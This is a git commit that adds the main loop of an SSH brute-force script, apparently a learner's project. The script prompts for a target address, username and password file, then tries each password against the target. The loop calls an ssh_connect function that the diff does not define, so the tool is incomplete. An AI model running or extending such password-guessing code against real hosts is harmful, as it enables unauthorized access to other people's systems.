bdb8a98d07b3a8a80fb71b23427791e0966a28d5
Kali machine <yelionel26@gmail.com>
2022-10-26 17:00:50 -0400

    Interacting with passwords file

--- sshbruteforce/sshbrute.py
+++ sshbruteforce/sshbrute.py
@@ -3,3 +3,17 @@ import sys
 import os
 import socket
 import termcolor
+
+host = input('[+] Target address: ')
+username = input('[+] SSH username: ')
+input_file = input('[+] Passwords file: ')
+
+if os.path.exists(input_file) == False:
+    print('[!!] That file/path doesn\'t exist')
+    sys.exit(1)
+
+with open(input_file, 'r') as file:
+    for line in file.readlines():
+        password = line.strip()
+        try:
+            ssh_connect(password)
